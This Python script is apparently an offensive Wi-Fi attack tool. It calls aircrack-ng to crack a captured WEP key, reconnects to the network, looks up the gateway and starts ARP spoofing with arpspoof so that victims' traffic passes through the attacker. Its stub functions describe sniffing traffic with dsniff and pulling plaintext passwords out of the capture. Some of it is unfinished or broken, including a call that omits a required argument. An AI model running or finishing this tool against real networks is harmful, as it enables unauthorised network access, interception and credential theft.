import os
import subprocess
from time import sleep

def aircrack():
    os.system("aircrack-ng wep.cap")

def connectToNetwork(interface):
    print("connecting to network") 
    os.system("airmon-ng stop {}".format(interface))
    os.system("ifconfig {} down".format(interface[0:len(interface) - 3]))
    os.system("ifconfig eth0 up")
    os.system("service network-manager start")

def getGatewayIP():
    with subprocess.Popen(["ip", "route"], stdout=subprocess.PIPE) as proc:
        out, _ = proc.communicate()
        for line in out.decode().split('\n'):
            if line.split()[0] == "default":
                return line.split()[2]
        raise Exception("Gateway IP not found.")

def sniffTraffic():
    # Log traffic to a file (i.e. dsniff -w dumpfile.pcap)
    pass

def parsePasswords():
    # Parse log file for plaintext passwords
    pass

def arpPoison(interface_name, host):
    arpSpoofProc = subprocess.Popen(["arpspoof", "-i", interface_name, host], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return arpSpoofProc


if __name__ == "__main__":
    aircrack()
    print("you can close the other terminal now! we cracked the password")
    connectToNetwork()
    connected = input("please connect to the network using the password. press enter when ready")

    gatewayIP = getGatewayIP()
    arpSpoofProc = arpPoison("wlan0mon", gatewayIP)
    sniffTraffic()
    parsePasswords()
    arpSpoofProc.terminate()
